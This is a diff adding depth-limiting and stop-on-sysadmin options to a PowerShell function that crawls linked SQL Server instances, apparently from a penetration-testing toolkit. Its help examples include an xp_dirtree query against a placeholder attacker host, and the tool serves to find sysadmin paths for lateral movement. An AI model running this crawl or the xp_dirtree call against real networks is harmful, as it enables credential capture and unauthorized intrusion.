@@ -15228,6 +15228,10 @@ Function Get-SQLServerLinkCrawl{
     Custom SQL query to run. If QueryTarget isn's given, this will run on each server.
     PARAMETER QueryTarget
     Link to run SQL query on.
+    .PARAMETER MaxDepth
+    Max crawl depth.
+    .PARAMETER StopOnSysAdmin
+    Stop crawl upon finding a SysAdmin link.
     .PARAMETER Export
     Convert collected data to exportable format.
     .Example
@@ -15248,8 +15252,11 @@ Function Get-SQLServerLinkCrawl{
     Get-SQLServerLinkCrawl -instance "SQLSERVER1\Instance1" -Query "exec xp_dirtree 'c:\temp'" -Export | format-table
     Get-SQLServerLinkCrawl -instance "SQLSERVER1\Instance1" -Query "exec xp_dirtree '\\attackerip\file'" -Export | format-table
     .Example
-     Crawl linked servers and return a list of databases for each one, then export to a to text objects for reporting.
+    Crawl linked servers and return a list of databases for each one, then export to a to text objects for reporting.
     Get-SQLServerLinkCrawl -instance "SQLSERVER1\Instance1" -Query "select name from master..sysdatabases" -Export | where name -ne "broken link" | sort name |  Format-Table
+    .EXAMPLE
+    Crawl linked servers up to a depth of 2, stopping upon finding a SysAdmin.
+    Get-SQLServerLinkCrawl -instance "SQLSERVER1\Instance1" -MaxDepth 2 -StopOnSysAdmin
     #>
     [CmdletBinding()]
     Param(
@@ -15288,6 +15295,14 @@ Function Get-SQLServerLinkCrawl{
         [string]$QueryTarget,
 
         [Parameter(Mandatory=$false,
+        HelpMessage="Max crawl depth.")]
+        [int]$MaxDepth,
+
+        [Parameter(Mandatory=$false,
+        HelpMessage="Stop crawl upon finding a SysAdmin link.")]
+        [Switch]$StopOnSysAdmin,
+
+        [Parameter(Mandatory=$false,
         HelpMessage="Convert collected data to exportable format.")]
         [switch]$Export
     )
@@ -15300,6 +15315,8 @@ Function Get-SQLServerLinkCrawl{
 
         $List += $Server
         $SqlInfoTable = New-Object System.Data.DataTable
+
+        $Visited = [System.Collections.Generic.HashSet[string]]::new()
     }
     
     Process
@@ -15309,21 +15326,44 @@ Function Get-SQLServerLinkCrawl{
             $i--
             foreach($Server in $List){
                 if($Server.Instance -eq "") {
-                    $List = (Get-SQLServerLinkData -list $List -server $Server -query $Query -QueryTarget $QueryTarget)
+                    $Path = $Server.Path -join ' -> '
+                    if ($MaxDepth -ne 0 -and ($Server.Path.Count - 1) -gt $MaxDepth) {
+                        Write-Verbose "$Path exceeds max depth. Skipping..."
+                        continue
+                    }
+
+                    $TempList = (Get-SQLServerLinkData -list $List -server $Server -query $Query -QueryTarget $QueryTarget)
+                    if ($Server.Instance -ne "Broken Link") {
+                        # if we've already been to this server with the same user, there's nothing new to log or find
+                        $key = "{0}:{1}" -f $Server.Instance, $Server.User
+                        if ($Visited.Contains($key)) {
+                            Write-Verbose "$Path has already been traversed with $($Server.User). Skipping..."
+                            continue
+                        }
+                        $Visited.Add($key) | Out-Null
+                    }
+                    $List = $TempList
                     $i++
 
                     # Verbose output
                     Write-Verbose "--------------------------------"
                     Write-Verbose " Server: $($Server.Instance)"
                     Write-Verbose "--------------------------------"
-                    Write-Verbose " - Link Path to server: $($Server.Path -join ' -> ')"                    
+                    Write-Verbose " - Link Path to server: $Path"
                     Write-Verbose " - Link Login: $($Server.User)"                                   
                     Write-Verbose " - Link IsSysAdmin: $($Server.Sysadmin)"
                     Write-Verbose " - Link Count: $($Server.Links.Count)"                    
                     Write-Verbose " - Links on this server: $($Server.Links -join ', ')"
+
+                    if ($StopOnSysAdmin -and $Server.Sysadmin -eq 1) {
+                        Write-Verbose "Found a SysAdmin, stopping..."
+                        return $Server
+                    }
                 }   
             } 
         }
+
+        $List = $List | Where-Object { $MaxDepth -eq 0 -or ($_.Path.Count - 1) -le $MaxDepth }
 
         if($Export){
             $LinkList = New-Object System.Data.Datatable
